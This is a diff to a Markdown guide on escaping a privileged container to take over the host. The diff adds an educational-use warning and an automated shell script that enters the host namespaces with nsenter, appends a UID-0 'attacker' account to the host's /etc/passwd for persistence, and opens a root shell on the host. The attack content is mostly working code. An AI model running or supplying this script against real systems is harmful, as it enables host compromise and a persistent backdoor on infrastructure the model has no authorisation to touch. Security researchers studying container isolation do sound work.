@@ -8,6 +8,16 @@ description: "Step-by-step guide on breaking out of a container and gaining cont
 
 This guide provides a detailed walkthrough of escaping from a container to gain full control over the host system. The process involves mounting the host's filesystem, modifying critical system files, and entering the host's namespaces.
 
+## **Warning: Security Risk**
+
+**This script is intended for educational and security research purposes only.** It demonstrates how an attacker can escape a container and gain access to the host system. Running this script on a production system or unauthorized environment can lead to **severe security breaches, data loss, and system compromise.**
+
+**Use this script only in a controlled, isolated testing environment where you have explicit permission.** Misuse of this information may violate company policies or legal regulations.
+
+**You are responsible for how you use this information.** Proceed with caution.
+
+---
+
 ## Prerequisites
 
 To successfully escape from a container, the following conditions must be met:
@@ -190,30 +200,52 @@ If `chroot` still fails, forcefully enter the host’s namespaces using `nsenter
 nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh
 ```
 
-- `--target 1` → Targets PID 1 (which is `systemd` or `init` on the host).
-- `--mount` → Joins the host’s mount namespace.
-- `--uts` → Joins the host’s UTS (hostname) namespace.
-- `--ipc` → Joins the host’s inter-process communication namespace.
-- `--net` → Joins the host’s network namespace.
-- `--pid` → Joins the host’s process namespace, making `ps aux` show all host processes.
+## **Automated Container Escape Script**
 
-#### Verify the Escape
+The following script automates the process of escaping a container by:
 
-Run:
+- Entering the host’s namespaces.
+- Mounting the host’s filesystem.
+- Adding a new root user for persistence.
+- Providing an interactive shell on the host.
 
 ```bash
-hostname
+#!/bin/sh
+
+echo "[*] Checking if the container has access to the host's root filesystem..."
+if [ ! -d "/proc/1/root" ]; then
+    echo "[-] Cannot access /proc/1/root. Escape is not possible."
+    exit 1
+fi
+
+echo "[+] Host root filesystem detected at /proc/1/root."
+
+# Step 1: Ensure full namespace entry using exec nsenter
+echo "[*] Attempting to enter the host's namespaces..."
+
+exec nsenter --target 1 --mount --uts --ipc --net --pid --root=/proc/1/root /bin/sh << 'EOF'
+    echo "[+] Successfully entered host namespaces."
+
+    # Step 2: Modify /etc/passwd on the host
+    echo "[*] Adding attacker user to /proc/1/root/etc/passwd..."
+    echo "attacker:x:0:0::/root:/bin/bash" >> /proc/1/root/etc/passwd
+
+    echo "[+] Attacker user added. Verifying..."
+    grep attacker /proc/1/root/etc/passwd
+
+    echo "[+] Escape complete. You are now inside the host."
+
+    # Verify host transition
+    echo "[*] Checking system state..."
+    echo "Hostname: $(hostname)"
+    echo "User: $(whoami)"
+    echo "[*] Checking if host kubelet process is visible..."
+    ps aux | grep kubelet
+
+    # Open an interactive shell inside the host
+    exec /bin/sh
+EOF
 ```
-
-Expected output: `controlplane` (or another real hostname).
-
-Check if the `kubelet` process is visible:
-
-```bash
-ps aux | grep kubelet
-```
-
-If you see `kubelet` running, you have fully escaped the container and now control the host.
 
 ## Conclusion
 
